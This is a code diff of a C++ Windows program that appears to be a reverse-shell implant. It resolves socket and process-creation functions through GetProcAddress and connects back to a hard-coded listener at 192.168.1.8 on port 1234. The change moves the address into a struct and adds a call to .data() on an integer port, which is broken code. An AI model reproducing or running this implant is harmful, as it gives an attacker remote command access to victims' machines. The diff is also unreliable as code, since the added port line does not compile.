@@ -49,16 +49,22 @@ int main() {
   pWSASocketA      dWSASocketA     = ( pWSASocketA     ) GetProcAddress ( Handle_WS2,       "WSASocketA"     );
   pWSAConnect      dWSAConnect     = ( pWSAConnect     ) GetProcAddress ( Handle_WS2,       "WSAConnect"     );
   pCreateProcessW  dCreateProcessW = ( pCreateProcessW ) GetProcAddress ( Handle_Kernel32,  "CreateProcessW" );
-  
-  int port                   { 1234 };
-  std::string_view ipAddress { "192.168.1.8" }; 
+ 
+  struct Host {
 
-  struct networking {
+    const int port                   { 1234 };
+    std::string_view ipAddress { "192.168.1.8" };
+
+  } host;
+
+  struct Networking {
+
     WSADATA              wsaData;
     SOCKET               windowsSocket;
     struct sockaddr_in   socketAddress;
     STARTUPINFOW         startupInformation;
     PROCESS_INFORMATION  processInformation;
+
   } net;
 
   if ( dWSAStartup ( MAKEWORD ( 2,2 ), &net.wsaData ) != 0) {
@@ -79,8 +85,8 @@ int main() {
   }
 
   net.socketAddress.sin_family      = AF_INET;
-  net.socketAddress.sin_port        = htons     ( port             );
-  net.socketAddress.sin_addr.s_addr = inet_addr ( ipAddress.data() );
+  net.socketAddress.sin_port        = htons     ( host.port.data()      );
+  net.socketAddress.sin_addr.s_addr = inet_addr ( host.ipAddress.data() );
 
   if (dWSAConnect (
       net.windowsSocket,
